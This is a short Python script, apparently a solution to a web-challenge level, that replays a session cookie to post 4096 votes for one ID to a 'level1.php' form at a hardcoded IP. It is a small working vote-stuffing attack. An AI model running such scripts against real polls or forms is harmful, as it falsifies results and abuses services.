import requests
page = "http://158.69.76.135/level1.php"
my_id = {
    'id': '1229',
    'holdthedoor': 'submit',
    'key': '0'
}
cookies = {
    "HoldTheDoor": '0'
}
response = requests.get(page)
for i in range(4096):
    cookies['holdthedoor'] = response.cookies['HoldTheDoor']
    requests.post(page, data=my_id, cookies=cookies)
